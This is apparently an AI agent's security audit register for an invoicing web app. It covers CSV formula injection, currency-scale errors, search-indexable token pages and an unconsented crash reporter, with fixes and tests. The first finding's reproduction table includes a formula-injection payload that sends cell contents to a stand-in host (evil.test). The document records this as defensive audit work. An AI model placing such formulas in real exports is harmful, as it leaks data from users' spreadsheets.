# Findings register — Agent #6 — 2026-11-20

**Pinned revision:** `d1f2c8dda3d8378270117d9c30d8aae3ee0337a6` (`main`) + this branch's fixes
**Severity:** Critical / High / Medium / Low, by user outcome, not by how interesting the bug is.
**Rule followed:** a finding is only "confirmed" when it was reproduced at the pinned revision or read
line by line; suspected items are labelled as such. Nothing here is extrapolated from a tool banner.

---

## Summary

| ID | Severity | What | Status on this branch |
|----|----------|------|-----------------------|
| **AF6-20261120-01** | **Medium** | `GET /api/v1/workspaces/:id/export?format=csv` writes user text unguarded (CSV formula injection, CWE-1236) and writes every amount as `/100` with two decimals whatever the currency (¥ ×100 high, KWD ×10 low) | **Confirmed, not fixed here** — `src/server/**` is AI #1's lane. Patch `patches/01-…patch` (`git apply --check` clean) + reproduction script + GitHub issue |
| **AF6-20261120-02** | **Medium** | The four bearer-token pages (`/i/<token>` invoice, `/c/<token>` portal, `/e/<token>` estimate, `/invite/<token>`) were served with `index, follow, max-image-preview:large` and a `robots.txt` of `Allow: /` — a customer link forwarded into a public place could be crawled, indexed and cached | **Fixed here** (`src/lib/privacyRobots.ts`, `src/main.tsx`, `public/robots.txt`, guard test). Server-side `X-Robots-Tag` half is reported for the lead |
| **AF6-20261120-03** | **Medium** | `index.html` shipped an inline crash reporter that POSTed message + raw stack to `/api/health`, which has only ever been a `GET`: nothing was recorded, the browser got a 404 per error, and the stack left the browser with no consent, no redaction and no de-duplication | **Fixed here** (inline script removed, `APP_INLINE_SCRIPT_HASHES` emptied, `vercel.json` CSP regenerated, preflight rule corrected, guard test) |
| **AF6-20261120-04** | **Low → Medium** | `sanitizeCsvCell` decided on the very first character, so a formula behind whitespace (` =1+1`, NBSP, zero-width space, BOM — the ordinary shape of Hebrew copied from a web page) was exported **unguarded** through every screen export (carried finding AF-010-F5, P3) | **Fixed here** (`src/lib/csv.ts`), 4-case regression suite |
| **AF6-20261120-05** | Info | Service worker caching of authenticated data (a class worth checking, not a defect found): `/api/*` and Supabase auth/rest/realtime/storage/functions are `NetworkOnly`; only content-hashed assets, and HTML is refused from the runtime cache | **Verified, no defect** |
| **AF6-20261120-06** | Info | Dependency surface: production dependency audit is clean (0 advisories at any severity); the 15 moderate advisories are dev-tool transitive only | **Verified, documented below** |
| **AF6-20261120-07** | — | Prior security findings on `main`: #824, #826, #827 are closed; #941–#945 (filed 19 Nov) are still open in the server lane | **Re-checked**, see §3 |

---

## 1. AF6-20261120-01 — Medium — the server's workspace CSV export bypasses both the formula guard and the currency scale

**Where:** `src/server/routes/workspaceApiRoutes.ts`, `handleWorkspaceExport`, the `if (format === "csv")`
block (lines 147–165 at `d1f2c8d`).

**What it does today**

```ts
let csvContent = "Date,Amount,Description,Category,Type,Status,Reference\n";
...
const amountStr = ((t.totalAmountCents || 0) / 100).toFixed(2);
const row = [t.date || '', amountStr,
  `"${(t.description || '').replace(/"/g, '""')}"`, ...];
```

1. **Formula injection.** Doubling quotes protects the CSV *structure*, not the spreadsheet. A
   description, category name or reference that begins with `=` (also behind whitespace) is written
   verbatim; Excel/LibreOffice/Sheets run it as a formula. Everywhere else the app writes CSVs through
   `toCsv` → `sanitizeCsvCell` (`src/lib/csvExport.ts`), so this handler is the one place that opted out
   of the guard the project documents (`src/lib/csv.ts`).
2. **Money scale.** Amounts are stored as whole minor units of their own currency
   (`src/lib/currencyMinorUnits.ts`: JPY 0 decimals, KWD 3). `/100` + `toFixed(2)` therefore writes
   ¥1,000,000 (stored `1000000`) as `10000.00` — **100× too high** — and KWD 12.345 (stored `12345`)
   as `123.45` — **10× too low**. This is the same class as #910/#940 (report CSVs) in a route those
   issues do not cover.

**Reachability:** `GET /api/v1/workspaces/:workspaceId/export?format=csv` (and `/api/workspaces/…`),
`apiAuthenticate` + workspace membership. No screen calls it with `format=csv` today (the UI's exports
build from the client writers), so this is an API-level defect: reachable by any member with the URL,
and the file is meant to be opened in a spreadsheet — which is exactly where both halves bite.

**Reproduction (no database needed):**

```
npx tsx audit/agent6-2026-11-20/repro/workspace-csv-export.mjs
```

Observed at `d1f2c8d` and after the patch:

| Input (stored) | Bytes written today | Bytes after `patches/01` |
|---|---|---|
| description ` =HYPERLINK("https://evil.test/collect?d="&A1,"Open invoice")` | `" =HYPERLINK(""…"")"` — **live formula** | `"' =HYPERLINK(""…"")"` — text |
| ¥ transaction, `totalAmountCents: 1000000` | `10000.00` | `1000000` |
| KWD transaction, `totalAmountCents: 12345` | `123.45` | `12.345` |
| USD transaction, `totalAmountCents: 1650000` | `16500.00` | `16500.00` (unchanged) |

**Correction:** `audit/agent6-2026-11-20/patches/01-workspace-csv-export-formula-and-currency.patch` —
routes every cell through `sanitizeCsvCell`, writes the amount with
`minorToMajor(cents, rowCurrency).toFixed(currencyDigits(rowCurrency))`, takes the row's own currency
(falling back to the workspace's), and uses CRLF + a trailing newline like the shared writer.
`git apply --check` passes on `d1f2c8d`; `tsc --noEmit` passes with the patch applied (verified in a
scratch working tree, then reverted — **no server file is changed on this branch**).

**Tests:** the patch has no test of its own here because the route needs a database; the arithmetic it
replaces is already unit-tested in `src/lib/currencyMinorUnits.ts` and the guard in
`src/tests/security-csv-formula-injection.test.ts` (this branch, 4 cases). The lead's fix should add a
route test with a JPY row and a KWD row plus a `=`-leading description.

---

## 2. AF6-20261120-02 — Medium — a token in the path is a credential, and the site invited crawlers in

**Where:** `public/robots.txt` (was `User-agent: * / Allow: /`), `index.html`
(`<meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1">`),
`src/App.tsx` routes 503/513/521/530 (`/c/`, `/e/`, `/i/`, `/invite/`).

**Why it matters:** those four pages open with **no sign-in**; the token *is* the credential. They are
all served the same `index.html`, so every one of them advertised itself as indexable. A customer who
pastes their invoice link into a public place (a forum, a review, a support thread, a public
"my invoices" page) hands it to a search engine: the document's text — customer name, address, line
items, amounts — can be indexed and its snippet cached, and link-preview bots that fetch pasted URLs
read the same page. `/i/` and `/e/` also carry actions (pay, sign).

**Fix on this branch:**

- `src/lib/privacyRobots.ts` — `TOKEN_PAGE_PREFIXES = ['/i/','/c/','/e/','/invite/']`,
  `TOKEN_PAGE_ROBOTS = 'noindex, nofollow, noarchive, nosnippet, noimageindex'`, `robotsForPath()`
  and `applyRobotsDirective()` (rewrites the existing meta, creates one if absent, never throws).
- `src/main.tsx` — `applyRobotsDirective(window.location.pathname)` runs before the first render, so the
  directive is in the document before any crawler reads it.
- `public/robots.txt` — `Disallow: /i/`, `/c/`, `/e/`, `/invite/`, `/api/`; `Allow: /` stays, so the
  marketing pages and `/status` are unaffected.
- Guard: `src/tests/security-token-page-indexing.test.ts` also fails if `App.tsx` ever routes a new
  prefix that `privacyRobots.ts` does not cover, so the class cannot come back quietly.

**Not done here (reported for the lead):** `X-Robots-Tag: noindex` on those responses. It is the
authoritative half — it survives a crawler that ignores the meta tag — and it has to be sent by the
server/edge before the SPA runs (`serveApp.ts` / `vercel.json` headers for `/i/*`, `/c/*`, `/e/*`,
`/invite/*`). It is one `headers` entry in `vercel.json` plus the Express equivalent, but it changes
API responses, so it is left to AI #1 with this finding rather than patched across the lane boundary.

**Verification:** 5/5 tests (`src/tests/security-token-page-indexing.test.ts`), including the App.tsx
route-coverage guard and the `robots.txt` content check.

---

## 3. AF6-20261120-03 — Medium — the inline crash reporter reported to a route that does not exist, without consent

**Where:** `index.html` (the `<script>` between the `noscript` block and the module entry) at `d1f2c8d`;
`src/server/routes/statusRoutes.ts` (`GET /api/health` only — there is no `POST`, anywhere in the repo).

**What it did:** on every `error` and `unhandledrejection` it POSTed
`{ error: e.message, stack: e.error.stack, type }` to `/api/health`.

**Three separate problems:**

1. **It could not work.** There is no `POST /api/health`. Every client error produced a 404 and no
   record. (The comment in `e2e/team-settings.spec.ts` — "health checks and error reports also POST in
   the background" — is the only trace of the intent.)
2. **It was unconsented and unredacted.** The app's real tracker (`src/lib/errorTracker.ts`,
   `initGlobalErrorTracking`) asks (`isOptionalTelemetryAllowed`), redacts (`redactForLogs`),
   de-duplicates by fingerprint, and clears its buffer at an account/workspace boundary. The inline
   script did none of that: it sent a raw stack — which routinely contains a customer name, an invoice
   number or a document path — off the device the moment anything threw, whatever the visitor had
   chosen in the cookie banner (the S-35 decision).
3. **It duplicated the listener** the app installs milliseconds later, so the only thing it added was
   the pre-`main.tsx` window, at the cost of a second, uncontrolled report path.

**Fix on this branch:**

- `index.html` — the inline script is gone; `main.tsx` keeps `initGlobalErrorTracking()` as its first
  statement (the new test asserts it still starts before `createRoot`).
- `src/server/http/contentSecurityPolicy.ts` — `APP_INLINE_SCRIPT_HASHES` is now `[]`, with the reason
  written down. `csp-report-only.test.ts` recomputes hashes from `index.html`, so the two cannot drift.
- `vercel.json` — the Report-Only CSP's `script-src` no longer names a hash that matches nothing
  (regenerated with `npm run csp:vercel`; the build's own `vercel-csp --check` passes).
- `scripts/check-security-headers.ts` — the preflight rule required a hash-pinned Report-Only policy
  because the page shipped an inline script. It now requires the Report-Only `script-src` to drop
  `'unsafe-inline'`, which is the tightening it was really measuring, and the hash only when the page
  has one. (Without this, the production preflight test fails on a policy that is *stricter* than before.)
- Guard: `src/tests/security-client-error-reporting.test.ts` (3 cases) — no inline script in
  `index.html`, no `/api/health` reference there, tracker starts before render, consent + redaction +
  scope guard still present.

**Test-contract change, stated openly:** one assertion in `src/tests/csp-report-only.test.ts` used to
require `APP_INLINE_SCRIPT_HASHES[0]` to be allowed by the enforced policy. With no inline scripts, that
expression read `undefined`; it now asserts the property for *every* hash the page has — including none.
The intent (a page that ships an inline script is never blocked by the enforced policy) is preserved.

---

## 4. AF6-20261120-04 — Low → Medium — a formula behind whitespace went out unguarded (AF-010-F5)

**Where:** `src/lib/csv.ts`, `sanitizeCsvCell` (and its inverse `unguardCsvCell`).

**What it did:** the guard tested `^[=+\-@\t\r]` against the raw cell, so `=1+1` was neutralised but
` =1+1` was not. Spreadsheets skip leading whitespace — ordinary spaces, non-breaking space (the usual
shape of Hebrew copied from a web page), zero-width space, byte-order mark — before deciding a cell is a
formula, and CWE-1236's mitigation is to decide on the character they actually look at. The repo already
carried this as a documented gap: `src/tests/audit-af010b-csv-dates.test.ts` asserted
`'OBSERVED GAP: leading-space formula passes through unneutralised'` (AF-010-F5, priority P3).

**Why it matters for this product:** every CSV the screens produce (accountant pack, year-end archive,
payment run, scheduled-report attachment, IIF-adjacent exports, Hebrew exports) goes through `toCsv`.
The text in those files comes from memos, customer names, vendor names and bank descriptions — data one
workspace member can type and another (the accountant) opens in Excel.

**Fix:** a single `looksLikeFormula()` decides the question for both directions; `SAFE_NUMBER` accepts a
leading space so `" -1,000.00"` stays a number; `unguardCsvCell` uses the same predicate, so
export → import round-trips unchanged, including files written before this fix.

**Verification:** `src/tests/security-csv-formula-injection.test.ts` (4 cases: 8 whitespace variants,
safe text and numbers, round-trip incl. legacy bytes, end-to-end through `toCsv` and `reportCsv`);
`audit-af010b-csv-dates.test.ts` now asserts the fixed behaviour (with the fix and its evidence named);
85/85 across 14 export/archive suites re-run unchanged.

---

## 5. AF6-20261120-05 — Info — PWA cache boundary (checked, no defect)

The service worker is generated by `vite-plugin-pwa` (`vite.config.ts`). `/api/*` and Supabase
auth/rest/realtime/storage/functions are `NetworkOnly`; the runtime cache is content-hashed assets only,
refuses `text/html`, and expires at 30 days / 120 entries; `navigateFallbackDenylist` keeps `/api` out of
the SPA fallback. Ledger data is not persisted in the browser at all (no `zustand/persist`, no
`indexedDB`; localStorage holds preference keys such as column layout and print settings). No action.

## 6. AF6-20261120-06 — Info — dependency surface at this revision

`npx tsx scripts/check-dependency-audit.ts` → **PASS**: production dependencies have 0 critical, 0 high,
0 moderate, 0 low at this lockfile. `npm audit` reports **15 moderate**, all dev-tool transitive:
`qs@6.15.1` under `@stryker-mutator/core → typed-rest-client`, `minimatch`/`glob` under
`eslint`/`typescript-eslint`/`workbox-build`. Express's own `qs` is `6.16.1` (patched). The allowlist
(`security-audit-allowlist.json`) stays empty because the gate does not block on moderate and none of
these is reachable from the shipped bundle. Recorded so the next session does not re-investigate.

## 7. AF6-20261120-07 — Prior findings re-checked at `d1f2c8d`

| Issue | State | Evidence |
|-------|-------|----------|
| #824 headerless double-post on `revenue.recognize` / `lease.capitalize` | **Closed** (fix in #848) | code + changelog in `docs/COORDINATION.md` |
| #826 / #827 admin audit + security polish | **Closed** (PR #908 merged 19 Nov, `06:00Z`) | `gh pr view 908` |
| #941 — workspace API keys can call `/api/v1/auth/*`; `legacyRoute` bypasses aal2 | **Open** | `gh issue list` |
| #942 — headerless retries on `/transactions`, `/payments`, `/transactions/intercompany/post` double-post | **Open** | same |
| #943 — platform-admin audit gaps (`public.admins`, CSP reset, `grant-admin`) | **Open** | same |
| #944 — `deleteAccount()` leaves raw emails in five tables | **Open** | same |
| #945 — login anomaly alerts, post-auth AI limiting, per-session revocation, member timestamps | **Open** | same |

Those five are all in `src/server/**` / RLS / migrations — AI #1's lane. They were re-confirmed as *open
in the tracker*, not re-reproduced in this session: this sandbox has no PostgreSQL server, and the
reproduction suites they came with (`src/tests/security-s5-idempotency-matrix.test.ts`,
`security-s11-session-hardening.test.ts`, `security-s26-admin-audit.test.ts`) need a live database.
**Stated plainly: not re-run here. CI runs them.**

---

## Suspected, not confirmed (reported, not claimed)

| # | Item | Why it is only suspected |
|---|------|--------------------------|
| S1 | Excel's exact behaviour on `" =1+1"` differs by version and locale | The guard is correct per CWE-1236 regardless; no claim is made about a specific spreadsheet build |
| S2 | `src/lib/partyOpeningBalance.ts` has a private `csvCell` that does not neutralise formulas | Its only output is POSTed to the server's open-item import, never downloaded to a spreadsheet; changing it changes bytes the import tests assert |
| S3 | `window.open(blobUrl, '_blank')` in `PdfPreviewModal.tsx` has no `noopener` | The blob is a PDF of the app's own making on the same origin; the opener risk is limited to the blob document, which cannot script |
